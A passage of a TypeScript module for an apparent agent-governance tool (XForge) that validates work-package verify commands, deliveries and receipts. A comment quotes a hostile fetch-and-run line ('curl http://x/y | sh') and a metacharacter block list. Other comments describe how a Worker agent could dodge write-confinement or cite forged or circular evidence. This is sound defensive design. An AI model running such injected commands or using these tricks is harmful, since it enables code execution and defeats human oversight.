import { access, readFile, realpath, stat } from 'node:fs/promises';
import { spawn } from 'node:child_process';
import path from 'node:path';
import fg from 'fast-glob';
import { MAX_GATE_OUTPUT_BYTES, WORK_PACKAGE_VERIFY_TIMEOUT_SECONDS } from '../constants.js';
import type {
  ChangeConfig,
  Diagnostic,
  GateResource,
  ProjectContext,
  WorkPackage,
  WorkPackageAckReceipt,
  WorkPackageDelivery,
  WorkPackageDispatchReceipt,
  WorkPackagePlan,
  WorkPackagePlanState,
  WorkPackageState,
} from '../types.js';
import type { SelectedResources } from './resource-loader.js';
import { XForgeError, diagnostic } from './errors.js';
import { normalizeRelative, pathsOverlap, safeResolve } from './path-safety.js';
import { validateSchema } from './validator.js';
import { loadYaml } from './yaml.js';
import { normalizeRule } from './governance.js';
import { sha256, stableStringify } from './hash.js';
import { readAcknowledgementAttestations, readAuditEvents } from './audit.js';
import type { AcknowledgementAttestations } from './audit.js';

const GLOB_MAGIC = /[*?{}[\]]/;
const UNSUPPORTED_GLOB_MAGIC = /[?{}[\]]/;

async function exists(filePath: string): Promise<boolean> {
  try { await access(filePath); return true; } catch { return false; }
}

function appendErrorDiagnostics(diagnostics: Diagnostic[], error: unknown): void {
  if (error instanceof XForgeError) diagnostics.push(...error.diagnostics);
  else throw error;
}

function hasMagic(pattern: string): boolean {
  return GLOB_MAGIC.test(pattern);
}

function staticPrefix(pattern: string): string {
  const segments = pattern.split('/');
  const literal: string[] = [];
  for (const segment of segments) {
    if (GLOB_MAGIC.test(segment)) break;
    literal.push(segment);
  }
  return literal.join('/') || '.';
}

function globRegex(pattern: string): RegExp {
  let source = '^';
  for (let index = 0; index < pattern.length;) {
    const character = pattern[index]!;
    if (character === '*' && pattern[index + 1] === '*') {
      if (pattern[index + 2] === '/') {
        source += '(?:.*/)?';
        index += 3;
      } else {
        source += '.*';
        index += 2;
      }
      continue;
    }
    if (character === '*') {
      source += '[^/]*';
      index += 1;
      continue;
    }
    source += /[\\^$+?.()|[\]{}]/.test(character) ? `\\${character}` : character;
    index += 1;
  }
  return new RegExp(`${source}$`);
}

function matchesPattern(filePath: string, pattern: string): boolean {
  return globRegex(pattern).test(filePath);
}

/**
 * A `verify` entry as it appears in `work-packages.yaml`: an argv array, or the deprecated
 * single-string form.
 *
 * The string form used to be the only form, and `workPackageVerificationGates` turned it into a Gate
 * with `shell: true`, so the whole string reached `/bin/sh -c` at the next `xforge check` past
 * Apply. Nothing upstream constrained it: the plan schema said "string, 1-4096 chars"; the
 * synthesized Gate is built in code and never schema-validated; `xforge/changes/**` is deliberately
 * outside the shipped `protected-files` policy because lifecycle Skills write Change content there;
 * and `core/lockfile.ts` digests Scaffold resources, not Change files. So a plan line reading
 * `verify: ["npm test; curl http://x/y | sh"]` was arbitrary command execution with a Stage
 * transition — an approval diff where a trailing `;` is easy to miss — as its only speed bump.
 *
 * The argv form removes the interpreter instead of trying to sanitize its input: `spawn(argv[0],
 * argv.slice(1), { shell: false })` cannot compose commands, redirect, or substitute, whatever the
 * plan says. That makes `verify` structured data rather than a program in another language.
 *
 * `types.ts` still declares `WorkPackage.verify` as `string[]`; the widening lives here because this
 * module is the only reader of the field (`commands/check.ts` consumes the rendered label, not the
 * entry). See `verifyEntries` for the single cast that spans the gap.
 */
type VerifyEntry = string | string[];

interface NormalizedVerify {
  /** What actually gets spawned. Empty when `problem` is set — such an entry must never run. */
  argv: string[];
  /** The rendering used in diagnostics, CLI output, and Evidence attribution. */
  label: string;
  /**
   * Strings a delivery may put in `validation[].command` to name this entry.
   *
   * `work-package-delivery.schema.json` types that field as a *string*, so an argv entry has to be
   * rendered to be recorded, and there is more than one obvious rendering. Accepting the shell-safe
   * label, the plain space-join, and the JSON array spares a Worker from guessing XForge's quoting
   * style. It weakens nothing: every accepted form is derived from the plan the control plane
   * already holds, so this stays an exact match against the declared command list.
   */
  accepted: string[];
  legacy: boolean;
  /** Why this entry cannot be run at all, if so. */
  problem: string | null;
}

/**
 * Characters that make a legacy string mean something to a shell beyond "run this program".
 *
 * A string containing any of these unquoted is refused rather than reinterpreted: `npm test; curl |
 * sh` parsed as a single argv would silently become a different, harmless command, which hides an
 * author's intent (or an attacker's) instead of reporting it.
 */
const LEGACY_VERIFY_FORBIDDEN = new Set([';', '|', '&', '<', '>', '(', ')', '`', '$', '{', '}', '*', '?', '[', ']', '~', '#', '!']);

/**
 * Splits a deprecated `verify` string into argv, or explains why it cannot be split safely.
 *
 * Deliberately not a shell parser. Words are separated by spaces and tabs; single and double quotes
 * group without expanding anything; there is no escape processing at all, because a backslash is a
 * path separator on Windows (`C:\...\node.exe`) far more often than an escape in a plan file, and
 * no metacharacter can be smuggled through one anyway — the forbidden set is rejected wherever it
 * appears unquoted, escaped or not. `$` and a backtick are refused even inside double quotes, where
 * a shell would expand them and this parser would not: that difference in meaning is exactly what
 * must not be guessed at.
 */
function parseLegacyVerify(command: string): { argv: string[]; problem: string | null } {
  const argv: string[] = [];
  let token = '';
  let started = false;
  let quote: '"' | "'" | null = null;
  for (const character of command) {
    if (character === '\n' || character === '\r' || (character < ' ' && character !== '\t')) {
      return { argv: [], problem: 'contains a newline or control character' };
    }
    if (quote === null && (character === ' ' || character === '\t')) {
      if (started) { argv.push(token); token = ''; started = false; }
      continue;
    }
    if (quote === null && (character === '"' || character === "'")) { quote = character; started = true; continue; }
    if (quote !== null && character === quote) { quote = null; continue; }
    if (quote === null && LEGACY_VERIFY_FORBIDDEN.has(character)) {
      return { argv: [], problem: `contains the unquoted shell metacharacter ${JSON.stringify(character)}` };
    }
    if (quote === '"' && (character === '$' || character === '`')) {
      return { argv: [], problem: `contains ${JSON.stringify(character)} inside double quotes, which a shell would expand and XForge would not` };
    }
    token += character;
    started = true;
  }
  if (quote !== null) return { argv: [], problem: 'has an unterminated quote' };
  if (started) argv.push(token);
  if (!argv[0]) return { argv: [], problem: 'is empty' };
  return { argv, problem: null };
}

/** Tokens that survive a shell unquoted, so a label built from them can be pasted into a terminal. */
const LABEL_SAFE_TOKEN = /^[A-Za-z0-9_@%+=:,./-]+$/;

function shellLabel(argv: string[]): string {
  return argv
    .map((token) => (LABEL_SAFE_TOKEN.test(token) ? token : `'${token.split("'").join("'\\''")}'`))
    .join(' ');
}

function normalizeVerifyEntry(entry: VerifyEntry): NormalizedVerify {
  if (Array.isArray(entry)) {
    if (!entry.length || !entry[0]) return { argv: [], label: JSON.stringify(entry), accepted: [], legacy: false, problem: 'is an empty argv array' };
    const label = shellLabel(entry);
    return { argv: [...entry], label, accepted: [...new Set([label, entry.join(' '), JSON.stringify(entry)])], legacy: false, problem: null };
  }
  const parsed = parseLegacyVerify(entry);
  /* The original string stays the label and the primary accepted form, so a plan and a delivery
     written before the argv form existed still agree with each other exactly. */
  return {
    argv: parsed.argv,
    label: entry,
    accepted: parsed.problem ? [] : [...new Set([entry, shellLabel(parsed.argv), parsed.argv.join(' ')])],
    legacy: true,
    problem: parsed.problem,
  };
}

/**
 * The one place the on-disk `verify` shape is reconciled with `types.ts`'s `string[]` declaration.
 *
 * Kept as a named cast rather than spread across call sites so the migration has a single seam to
 * delete when `WorkPackage.verify` is retyped and the legacy string form is dropped.
 */
function verifyEntries(workPackage: WorkPackage): VerifyEntry[] {
  return workPackage.verify as unknown as VerifyEntry[];
}

export function normalizeVerify(workPackage: WorkPackage): NormalizedVerify[] {
  return verifyEntries(workPackage).map(normalizeVerifyEntry);
}

function patternWithinScope(pattern: string, scope: string): boolean {
  if (pattern === scope) return true;
  if (!hasMagic(scope)) {
    return !hasMagic(pattern) && (pattern === scope || pattern.startsWith(`${scope}/`));
  }
  if (!scope.endsWith('/**')) return false;
  const scopeRoot = scope.slice(0, -3).replace(/\/$/, '') || '.';
  const candidate = staticPrefix(pattern);
  return candidate === scopeRoot || candidate.startsWith(`${scopeRoot}/`);
}

function patternsPotentiallyOverlap(left: string, right: string): boolean {
  if (!hasMagic(left) && !hasMagic(right)) return pathsOverlap(left, right);
  const leftPrefix = staticPrefix(left);
  const rightPrefix = staticPrefix(right);
  if (leftPrefix === '.' || rightPrefix === '.') return true;
  return pathsOverlap(leftPrefix, rightPrefix);
}

function dependsTransitively(packages: Map<string, WorkPackage>, start: string, target: string, seen = new Set<string>()): boolean {
  if (seen.has(start)) return false;
  seen.add(start);
  for (const dependency of packages.get(start)?.depends_on ?? []) {
    if (dependency === target || dependsTransitively(packages, dependency, target, seen)) return true;
  }
  return false;
}

function executionWaves(packages: WorkPackage[]): Array<{ index: number; packages: string[] }> {
  const remaining = new Map(packages.map((item) => [item.id, new Set(item.depends_on)]));
  const completed = new Set<string>();
  const waves: Array<{ index: number; packages: string[] }> = [];
  while (remaining.size > 0) {
    const ready = [...remaining]
      .filter(([, dependencies]) => [...dependencies].every((dependency) => completed.has(dependency)))
      .map(([id]) => id)
      .sort();
    if (ready.length === 0) break;
    waves.push({ index: waves.length + 1, packages: ready });
    for (const id of ready) {
      remaining.delete(id);
      completed.add(id);
    }
  }
  return waves;
}

interface GitResult {
  code: number;
  stdout: string;
  stderr: string;
}

export async function git(root: string, args: string[]): Promise<GitResult> {
  const environment: NodeJS.ProcessEnv = {};
  for (const name of ['PATH', 'SystemRoot', 'HOME', 'TMPDIR', 'TEMP', 'TMP']) {
    if (process.env[name]) environment[name] = process.env[name];
  }
  return new Promise((resolve) => {
    const child = spawn('git', ['-c', 'core.quotepath=false', '-C', root, ...args], {
      shell: false,
      env: environment,
      stdio: ['ignore', 'pipe', 'pipe'],
    });
    const stdout: Buffer[] = [];
    const stderr: Buffer[] = [];
    let stdoutBytes = 0;
    let stderrBytes = 0;
    child.stdout.on('data', (chunk: Buffer) => {
      if (stdoutBytes >= MAX_GATE_OUTPUT_BYTES) return;
      const selected = chunk.subarray(0, MAX_GATE_OUTPUT_BYTES - stdoutBytes);
      stdout.push(selected);
      stdoutBytes += selected.byteLength;
    });
    child.stderr.on('data', (chunk: Buffer) => {
      if (stderrBytes >= MAX_GATE_OUTPUT_BYTES) return;
      const selected = chunk.subarray(0, MAX_GATE_OUTPUT_BYTES - stderrBytes);
      stderr.push(selected);
      stderrBytes += selected.byteLength;
    });
    child.on('error', (error) => resolve({ code: 127, stdout: '', stderr: error.message }));
    child.on('close', (code) => resolve({
      code: code ?? 1,
      stdout: Buffer.concat(stdout).toString('utf8'),
      stderr: Buffer.concat(stderr).toString('utf8'),
    }));
  });
}

/**
 * Paths the control plane writes on its own behalf: dispatch receipts, acknowledgement receipts and
 * the audit index.
 *
 * These can never count as a worker's output. Citing `evidence/audit/index.json` as proof that a
 * verify command passed is circular — the file exists because XForge dispatched the package, not
 * because anybody did the work. `agents/<id>/ack/` is the same shape of claim one step further on:
 * a worker that maps a done_when criterion to its own acknowledgement receipt is citing the record
 * of somebody accepting the work as proof that the work was done.
 */
function isControlPlaneBookkeeping(filePath: string, changeRoot: string): boolean {
  if (!filePath.startsWith(`${changeRoot}/evidence/`)) return false;
  const tail = filePath.slice(`${changeRoot}/evidence/`.length);
  /* `review/ack/` joined this list when Change-level review receipts moved out of
     `evidence/agents/review/`: without it a work package could cite a review receipt as its own
     `done_when` evidence, which is the circular claim this function exists to reject. */
  return tail.startsWith('audit/') || /^(?:agents\/[^/]+|review)\/(?:dispatch|ack)\//.test(tail);
}

/**
 * The citable part of a `done_when_evidence` entry, with any explanation stripped.
 *
 * The relevance check is exact-match against a command that ran or a path that changed, and it used
 * to be applied to the whole string. So `"cargo build 退出码 0（validation 第 1 条）"` was rejected and
 * the bare `"cargo build"` accepted — which squeezed every citation down to a naked reference and
 * removed the room to say *what about it* mattered. That shape rewards whatever reference is
 * easiest to produce, which is how a delivery ends up citing a lint run for a durability claim: the
 * check's own form was inviting the padding it was meant to prevent.
 *
 * An entry may now read `<reference> — <explanation>`; only the reference is matched. An optional
 * `command:` / `path:` prefix states which kind is intended, and is stripped the same way.
 */
export function evidenceReference(entry: string): string {
  const withoutPrefix = entry.replace(/^\s*(?:command|path):\s*/i, '');
  /* An em dash, an en dash, or a spaced `--`. All three require surrounding spaces so a hyphen
     inside a filename or a command flag is never mistaken for the separator. */
  const [reference] = withoutPrefix.split(/\s+(?:—|–|--)\s+/);
  return (reference ?? withoutPrefix).trim();
}

/**
 * The same reference with a trailing line locator removed: `src/store/mod.rs:166`, `…:166-190`.
 *
 * Citing a path and a line is how people cite code, and it was the one spelling the matcher refused:
 * the reference is compared against the delivery's `changed_paths` by exact equality, so the line
 * number turned a correct citation into an irrelevant one. Ten entries were rewritten across two
 * round trips over exactly this.
 *
 * Only ever applied as a *fallback*, after the literal reference has failed to match, so a file
 * whose name genuinely ends in `:<digits>` still resolves as itself first. The suffix is stripped,
 * never interpreted — nothing here claims the cited line says what the entry says it does, which is
 * the same limit the whole check already operates under.
 */
export function evidenceReferenceWithoutLine(reference: string): string | null {
  const match = /^(.*[^/]):(\d+)(?:-(\d+))?$/.exec(reference);
  return match ? match[1]! : null;
}

/**
 * Whether this package delivers the plan's assembly rather than one unit of its decomposition.
 *
 * Absent `role` means `worker`, so every plan written before the field existed keeps its meaning
 * exactly: a plan with no `integrator_paths` and no `role` is unaffected by any of this.
 */
export function isIntegratorPackage(workPackage: Pick<WorkPackage, 'role'>): boolean {
  return workPackage.role === 'integrator';
}

function protectedWritePaths(project: ProjectContext, changeId: string, config: ChangeConfig, resources: SelectedResources, integratorPaths: string[] = []): string[] {
  const changeRoot = `${project.changesPath}/${changeId}`;
  const paths = new Set([
    'xforge/manifest.yaml',
    'xforge/lock.yaml',
    'xforge/constitution.md',
    `${project.specsPath}/**`,
    `${changeRoot}/**`,
  ]);
  for (const rule of resources.rules.values()) {
    const normalized = normalizeRule(rule.value);
    if (normalized.legacyWritePolicy !== 'integrator-only') continue;
    if (normalized.modules.length && !normalized.modules.some((module) => config.scope.modules.includes(module))) continue;
    for (const declared of normalized.paths) paths.add(declared);
  }
  for (const policy of resources.policies.values()) {
    if (policy.value.spec.capability !== 'fs.write' || policy.value.spec.effect === 'allow') continue;
    for (const declared of policy.value.spec.match.paths ?? []) paths.add(declared);
  }
  /*
   * Paths the plan declares as the Integrator's own.
   *
   * Everything else in this set is governance surface. Product source had no way to be Integrator
   * territory at all, and integration legitimately produces some: a module list, a DI root, a
   * config assembly point — files that belong to no single package because they are what joins the
   * packages together. Creating one during integration made the delivery check report a path "no
   * work package declared and no Integrator-only path covers", and the only way out was to file it
   * under whichever package happened to be nearby, which records a falsehood about who delivered it.
   *
   * Joining this set gives both needed properties at once: the path becomes attributable, so it
   * stops invalidating deliveries, and the existing overlap rule starts refusing any package that
   * declares it — which is what "Integrator-only" has to mean to be worth declaring.
   */
  for (const declared of integratorPaths) paths.add(declared);
  return [...paths].sort();
}

/** The package directory a `evidence/agents/<pkg>/<file>` path names. */
function directoryIdOf(name: string): string {
  return name.split('/')[2] ?? '<package>';
}

async function loadDeliveries(
  project: ProjectContext,
  changeId: string,
  knownPackages: Set<string>,
): Promise<{ deliveries: Map<string, WorkPackageDelivery[]>; diagnostics: Diagnostic[] }> {
  const diagnostics: Diagnostic[] = [];
  const deliveries = new Map<string, WorkPackageDelivery[]>();
  const changeRoot = `${project.changesPath}/${changeId}`;
  const changeDirectory = await safeResolve(project.root, changeRoot);
  const names = (await fg('evidence/agents/*/*.yaml', {
    cwd: changeDirectory,
    onlyFiles: true,
    followSymbolicLinks: false,
    unique: true,
  })).sort();
  const executionKeys = new Set<string>();

  for (const name of names) {
    const projectPath = `${changeRoot}/${name}`;
    let delivery: WorkPackageDelivery;
    try {
      delivery = await loadYaml<WorkPackageDelivery>(await safeResolve(project.root, projectPath), projectPath);
    } catch (error) {
      appendErrorDiagnostics(diagnostics, error);
      continue;
    }
    const schemaDiagnostics = await validateSchema('work-package-delivery', delivery, projectPath);
    diagnostics.push(...schemaDiagnostics);
    if (schemaDiagnostics.some((item) => item.severity === 'error')) {
      /*
       * Says which file does not belong here, rather than only which fields it lacks.
       *
       * Everything directly under `evidence/agents/<package>/` with a `.yaml` extension is read as a
       * delivery record, and a review transcript parked there is therefore validated as one. The
       * resulting report is accurate and useless: it asks for a dispatch receipt, non-empty
       * `changed_paths` and per-criterion `done_when_evidence`, none of which a read-only review can
       * ever have. A live Major run spent six rounds — including bisecting by moving files out of
       * the directory and back — to find that the file simply should not have been there. The
       * Skill now writes transcripts to `review/<execution>.md`; this is for the ones already on
       * disk, and for anything else that lands in the delivery slot by accident.
       */
      if (/(^|\/)review[-.]/.test(name)) diagnostics.push(diagnostic(
        'XFORGE_WORK_PACKAGE_DELIVERY_SLOT_MISUSED',
        `${projectPath} sits where delivery records live, so it was validated as one, and the errors above are about the delivery shape rather than about this file. A read-only review transcript belongs in evidence/agents/${directoryIdOf(name)}/review/ with a .md extension, where nothing parses it as a delivery; move it there and acknowledge it with --as reviewer --evidence <the new path>.`,
        projectPath,
        'error',
      ));
      continue;
    }

    const parts = name.split('/');
    const directoryId = parts[2]!;
    const fileExecutionId = path.posix.basename(name, '.yaml');
    if (delivery.package_id !== directoryId) {
      diagnostics.push(diagnostic('XFORGE_WORK_PACKAGE_DELIVERY_PATH_MISMATCH', 'Delivery package_id must match its evidence directory.', projectPath));
    }
    if (delivery.execution_id !== fileExecutionId) {
      diagnostics.push(diagnostic('XFORGE_WORK_PACKAGE_DELIVERY_PATH_MISMATCH', 'Delivery execution_id must match its evidence filename.', projectPath));
    }
    if (!knownPackages.has(delivery.package_id)) {
      diagnostics.push(diagnostic('XFORGE_WORK_PACKAGE_DELIVERY_UNKNOWN', `Delivery references unknown work package ${delivery.package_id}.`, projectPath));
      continue;
    }
    const executionKey = `${delivery.package_id}:${delivery.execution_id}`;
    if (executionKeys.has(executionKey)) {
      diagnostics.push(diagnostic('XFORGE_WORK_PACKAGE_EXECUTION_DUPLICATE', `Duplicate work package execution ${executionKey}.`, projectPath));
      continue;
    }
    executionKeys.add(executionKey);
    const list = deliveries.get(delivery.package_id) ?? [];
    list.push(delivery);
    deliveries.set(delivery.package_id, list);
  }
  return { deliveries, diagnostics };
}

function latestDelivery(deliveries: WorkPackageDelivery[] | undefined): WorkPackageDelivery | null {
  if (!deliveries?.length) return null;
  return [...deliveries].sort((left, right) => {
    const byTime = Date.parse(left.recorded_at) - Date.parse(right.recorded_at);
    return byTime === 0 ? left.execution_id.localeCompare(right.execution_id) : byTime;
  }).at(-1) ?? null;
}

async function loadDispatches(
  project: ProjectContext,
  changeId: string,
  knownPackages: Set<string>,
  /** Restricts the scan to one package's receipts; without it every package in the plan is read. */
  onlyPackage?: string,
): Promise<{ dispatches: Map<string, WorkPackageDispatchReceipt[]>; diagnostics: Diagnostic[] }> {
  const diagnostics: Diagnostic[] = [];
  const dispatches = new Map<string, WorkPackageDispatchReceipt[]>();
  const changeRoot = `${project.changesPath}/${changeId}`;
  const changeDirectory = await safeResolve(project.root, changeRoot);
  const names = (await fg(onlyPackage ? `evidence/agents/${onlyPackage}/dispatch/*.json` : 'evidence/agents/*/dispatch/*.json', {
    cwd: changeDirectory,
    onlyFiles: true,
    followSymbolicLinks: false,
    unique: true,
  })).sort();
  for (const name of names) {
    const projectPath = `${changeRoot}/${name}`;
    try {
      const dispatch = JSON.parse(await readFile(await safeResolve(project.root, projectPath), 'utf8')) as WorkPackageDispatchReceipt;
      const schemaDiagnostics = await validateSchema('work-package-dispatch', dispatch, projectPath);
      diagnostics.push(...schemaDiagnostics);
      if (schemaDiagnostics.some((item) => item.severity === 'error')) continue;
      const parts = name.split('/');
      const directoryId = parts[2]!;
      const executionId = path.posix.basename(name, '.json');
      const { digest, ...unsigned } = dispatch;
      if (dispatch.change !== changeId || dispatch.packageId !== directoryId || dispatch.executionId !== executionId) {
        diagnostics.push(diagnostic('XFORGE_WORK_PACKAGE_DISPATCH_PATH_MISMATCH', 'Dispatch identifiers must match their Change and evidence path.', projectPath));
        continue;
      }
      if (digest !== sha256(stableStringify(unsigned))) {
        diagnostics.push(diagnostic('XFORGE_WORK_PACKAGE_DISPATCH_DIGEST_INVALID', 'Work package dispatch receipt digest is invalid.', projectPath));
        continue;
      }
      if (!knownPackages.has(dispatch.packageId)) {
        diagnostics.push(diagnostic('XFORGE_WORK_PACKAGE_DISPATCH_UNKNOWN', `Dispatch references unknown work package ${dispatch.packageId}.`, projectPath));
        continue;
      }
      const list = dispatches.get(dispatch.packageId) ?? [];
      list.push(dispatch);
      dispatches.set(dispatch.packageId, list);
    } catch (error) {
      diagnostics.push(diagnostic('XFORGE_WORK_PACKAGE_DISPATCH_INVALID', `Dispatch receipt is invalid: ${(error as Error).message}`, projectPath));
    }
  }
  return { dispatches, diagnostics };
}

/**
 * The most recent dispatch receipt for one package, validated exactly as `resolveWorkPackages`
 * validates it. Used by `work-package draft` to read back the bindings XForge itself issued, rather
 * than asking an Agent to copy four opaque digests out of a receipt by hand.
 */
export async function latestDispatchFor(
  project: ProjectContext,
  changeId: string,
  packageId: string,
  knownPackages?: Set<string>,
): Promise<{ dispatch: WorkPackageDispatchReceipt | null; diagnostics: Diagnostic[] }> {
  /*
   * Scoped to the one package, because `loadDispatches` walks every package's receipts.
   *
   * It used to be handed `new Set([packageId])` as the known-package set while still scanning
   * `evidence/agents/<id>/dispatch/*.json`, so every *other* package's receipt was reported as
   * `XFORGE_WORK_PACKAGE_DISPATCH_UNKNOWN` — an error, carried into the envelope by
   * `work-package draft`. The count scaled with the plan: a live Major run with thirteen packages
   * got twelve errors on every draft, whichever package it asked for, and wrote all thirteen
   * delivery records by hand as a result. `draft` reads back one execution's bindings; validating
   * the rest of the plan is `check`'s job, and it still does it.
   */
  const loaded = await loadDispatches(project, changeId, knownPackages ?? new Set([packageId]), packageId);
  return { dispatch: latestDispatch(loaded.dispatches.get(packageId)), diagnostics: loaded.diagnostics };
}

function latestDispatch(dispatches: WorkPackageDispatchReceipt[] | undefined): WorkPackageDispatchReceipt | null {
  if (!dispatches?.length) return null;
  return [...dispatches].sort((left, right) => {
    const byTime = Date.parse(left.issuedAt) - Date.parse(right.issuedAt);
    return byTime === 0 ? left.executionId.localeCompare(right.executionId) : byTime;
  }).at(-1) ?? null;
}

/** The lifecycle status an acknowledgement in each role is allowed to claim. */
const ACK_ROLE_STATUS: Record<WorkPackageAckReceipt['as'], WorkPackageAckReceipt['status']> = {
  integrator: 'integrated',
  reviewer: 'reviewed',
};

/**
 * Loads `WorkPackageAckReceipt` files, the Git-tracked counterpart to the (gitignored) local audit
 * chain's `work-package.reviewed`/`work-package.integrated` events.
 *
 * `.audit/` is gitignored project-wide (see `xforge/scaffold/payload/xforge/.audit/.gitignore`), so
 * a fresh `git clone` has no local audit history at all. Without a Git-tracked receipt, every
 * previously reviewed/integrated work package would silently read back as merely `succeeded` on a
 * clone — the review/integration record would be invisibly lost.
 *
 * Every property a receipt commits to is computable offline by whoever wrote the file, so none of
 * them can establish that an acknowledgement actually happened. The audit chain does: a receipt
 * counts only when `readAcknowledgementAttestations` finds the matching `work-package.reviewed`/
 * `.integrated` event (see its doc comment for the fresh-clone escape). Everything else here is a
 * consistency check that decides whether a file is worth considering at all.
 *
 * A receipt written before attestation shipped carries an audit event whose `inputDigest` covered
 * the evidence path too, which no reader can recompute from the receipt, so it reads as unattested.
 * That fails closed — the package reads back at its pre-receipt status with a warning naming the
 * file — and re-running `acknowledge` re-establishes it. Widening the rule to "some acknowledgement
 * event exists for this Change" would restore those receipts but accept forged ones alongside them,
 * because the index event summary carries no package or role to bind a receipt to.
 *
 * Those checks all diagnose at `warning`, unlike the delivery and dispatch loaders above, and the
 * asymmetry is deliberate. A delivery or a dispatch receipt is load-bearing: the gate result depends
 * on it, so a broken one must stop the run. An ack receipt is a redundant mirror of the audit chain,
 * so skipping a broken one degrades to the audit-event path instead of losing a safety property —
 * whereas erroring means an ordinary rework (dropping a package from `work-packages.yaml` while its
 * receipt file is still on disk, or a half-written JSON file under `ack/`) fails `xforge check` and
 * blocks every transition for a file that can only ever *add* status, never remove a check.
 */
async function loadAckReceipts(
  project: ProjectContext,
  changeId: string,
  knownPackages: Set<string>,
  deliveries: Map<string, WorkPackageDelivery[]>,
  attestations: AcknowledgementAttestations,
): Promise<{ receipts: Map<string, WorkPackageAckReceipt[]>; diagnostics: Diagnostic[] }> {
  const diagnostics: Diagnostic[] = [];
  const receipts = new Map<string, WorkPackageAckReceipt[]>();
  const changeRoot = `${project.changesPath}/${changeId}`;
  const changeDirectory = await safeResolve(project.root, changeRoot);
  const names = (await fg('evidence/agents/*/ack/*.json', {
    cwd: changeDirectory,
    onlyFiles: true,
    followSymbolicLinks: false,
    unique: true,
  })).sort();
  for (const name of names) {
    const projectPath = `${changeRoot}/${name}`;
    let receipt: WorkPackageAckReceipt;
    try {
      receipt = JSON.parse(await readFile(await safeResolve(project.root, projectPath), 'utf8')) as WorkPackageAckReceipt;
    } catch (error) {
      diagnostics.push(diagnostic('XFORGE_WORK_PACKAGE_ACK_RECEIPT_INVALID', `Acknowledgement receipt is not valid JSON: ${(error as Error).message}`, projectPath, 'warning'));
      continue;
    }
    /* Downgraded for the same reason as the checks below: a malformed ack file is skipped, not fatal. */
    const schemaDiagnostics = await validateSchema('work-package-ack-receipt', receipt, projectPath);
    const schemaFailed = schemaDiagnostics.some((item) => item.severity === 'error');
    diagnostics.push(...schemaDiagnostics.map((item) => ({ ...item, severity: 'warning' as const })));
    if (schemaFailed) continue;
    const { digest, ...unsigned } = receipt;
    if (digest !== sha256(stableStringify(unsigned))) {
      diagnostics.push(diagnostic('XFORGE_WORK_PACKAGE_ACK_RECEIPT_DIGEST_INVALID', 'Acknowledgement receipt digest is invalid.', projectPath, 'warning'));
      continue;
    }
    const parts = name.split('/');
    const directoryId = parts[2]!;
    const fileName = path.posix.basename(name, '.json');
    if (receipt.change !== changeId || receipt.packageId !== directoryId || fileName !== `${receipt.executionId}-${receipt.as}`) {
      diagnostics.push(diagnostic('XFORGE_WORK_PACKAGE_ACK_RECEIPT_PATH_MISMATCH', 'Acknowledgement receipt identifiers must match its Change and evidence path.', projectPath, 'warning'));
      continue;
    }
    /*
     * The filename check above binds the file to `as`, but nothing bound `as` to `status` — so an
     * `as: integrator` receipt could claim `status: reviewed` and skip the independent review step
     * the reviewer role exists to record. `acknowledge` only ever writes the pairing below.
     */
    if (receipt.status !== ACK_ROLE_STATUS[receipt.as]) {
      diagnostics.push(diagnostic(
        'XFORGE_WORK_PACKAGE_ACK_RECEIPT_ROLE_MISMATCH',
        `Acknowledgement receipt as "${receipt.as}" must record status "${ACK_ROLE_STATUS[receipt.as]}", not "${receipt.status}".`,
        projectPath,
        'warning',
        { as: receipt.as, status: receipt.status },
      ));
      continue;
    }
    if (!knownPackages.has(receipt.packageId)) {
      diagnostics.push(diagnostic('XFORGE_WORK_PACKAGE_ACK_RECEIPT_UNKNOWN', `Acknowledgement receipt references unknown work package ${receipt.packageId}.`, projectPath, 'warning'));
      continue;
    }
    const matchingDelivery = deliveries.get(receipt.packageId)?.find((item) => item.execution_id === receipt.executionId);
    if (!matchingDelivery || sha256(stableStringify(matchingDelivery)) !== receipt.deliveryDigest) {
      diagnostics.push(diagnostic(
        'XFORGE_WORK_PACKAGE_ACK_RECEIPT_DELIVERY_MISMATCH',
        `Acknowledgement receipt for ${receipt.packageId} does not match a known delivery for execution ${receipt.executionId}.`,
        projectPath,
        'warning',
      ));
      continue;
    }
    if (!attestations.attests(receipt.digest)) {
      /* A receipt the chain never attested reads as a forgery: it must not drive status, and it is
         dropped here rather than filtered later so nothing downstream can expose it as real. */
      diagnostics.push(diagnostic(
        'XFORGE_WORK_PACKAGE_ACK_UNATTESTED',
        `Acknowledgement receipt for ${receipt.packageId} (${receipt.as}) is not attested by the audit chain and is ignored.`,
        projectPath,
        'warning',
        { packageId: receipt.packageId, as: receipt.as, actor: receipt.actor.id },
      ));
      continue;
    }
    const list = receipts.get(receipt.packageId) ?? [];
    list.push(receipt);
    receipts.set(receipt.packageId, list);
  }
  return { receipts, diagnostics };
}

/**
 * What the control plane knows independently of the delivery being validated.
 *
 * Every other property of a delivery is self-reported; these are read from the repository and the
 * plan at validation time, which is what makes the checks below something a Worker cannot arrange.
 */
interface DeliveryContext {
  /** The repository HEAD as `resolveWorkPackages` observed it, or null when Git was unusable. */
  repositoryHead: string | null;
  /**
   * Paths a commit after the delivery's head may touch without being attributed to this Worker:
   * every package's declared `write_paths` plus the Integrator-only surfaces (`protectedWritePaths`).
   */
  attributablePaths: string[];
  verify: NormalizedVerify[];
}

/**
 * Anchors the end of the inspected range to something the control plane observed.
 *
 * The `write_paths` confinement below diffs `base_commit...head_commit`, and *both* endpoints came
 * out of the delivery YAML the Worker writes. So the Worker chose the range it would be judged on:
 * commit the in-scope work as A and the out-of-scope writes as B, declare `base_commit = A^` and
 * `head_commit = A`, and the range is clean, `changed_paths` matches the diff exactly, and no
 * XFORGE_WORK_PACKAGE_WRITE_ESCAPE fires. The parallel-write conflict rule and the
 * `protectedWritePaths` overlap rule fall to the same trick, because both constrain the declared
 * *plan* and never what a Worker actually wrote.
 *
 * The fix is to stop accepting "the range I chose is clean" as an answer to "is the tree clean".
 * The strongest form — `head_commit` must equal HEAD — is what an isolated single delivery should
 * satisfy, but it cannot be the whole rule: deliveries accumulate. Committing the delivery record
 * itself, dispatching the next package, an Integrator merge, or a second work package all move HEAD
 * past an earlier, perfectly good `head_commit`, and `requireDeliveries` re-validates every delivery
 * at Verify and again at archive. A literal HEAD-equality rule would make any Change with more than
 * one commit after its first delivery permanently unable to leave Apply.
 *
 * So the rule is: everything between the delivery's head and HEAD must still be accounted for. The
 * remainder may contain only paths some package in this plan declared it would write, or paths the
 * plan is forbidden to declare at all because they belong to the Integrator and the control plane
 * (`protectedWritePaths` — the Change directory, Specs, the manifest, the lock, the Constitution).
